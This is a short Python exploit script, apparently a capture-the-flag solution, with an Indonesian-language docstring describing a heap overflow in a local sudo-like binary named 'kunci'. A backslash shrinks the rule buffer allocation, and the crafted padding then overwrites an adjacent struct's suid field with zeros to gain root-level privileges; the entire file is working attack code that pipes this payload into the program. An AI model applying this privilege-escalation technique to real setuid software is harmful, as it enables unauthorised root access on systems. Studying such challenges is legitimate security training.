#!/usr/bin/env python3
"""Kunci Sudo Sing Kesasar — heap overflow ke struct {owner, uid, suid}.

Bug: rule buffer dialokasikan sepanjang strcspn(buf, "\\")+1, tetapi
unescape_copy() menyalin panjang penuh hasil baca_baris(). Backslash di
awal membuat alokasi kecil; sisa input meng-overflow chunk struct yang
dialokasikan tepat setelahnya. Kita set suid = 0.

Jalankan dari folder ini: python3 solve_kunci.py
"""
import subprocess
from pathlib import Path

HERE = Path(__file__).resolve().parent
# Output offset 0x34 = struct->suid (rule user -> struct user 0x20 + 0x14)
payload = b"ALL\\" + b"A" * (0x34 - 3) + b"\x00" * 4 + b"\n"
p = subprocess.run([str(HERE / "kunci")], input=payload, capture_output=True)
print(p.stdout.decode(errors="replace"))
